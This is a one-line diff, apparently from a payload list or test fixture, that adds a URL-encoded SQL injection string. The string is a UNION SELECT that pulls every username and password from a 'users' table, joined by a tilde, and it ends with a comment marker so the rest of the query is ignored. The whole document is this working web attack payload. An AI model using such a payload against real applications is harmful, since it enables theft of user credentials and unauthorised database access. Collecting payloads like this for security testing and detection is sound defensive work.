@@ -1,0 +1,1 @@
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
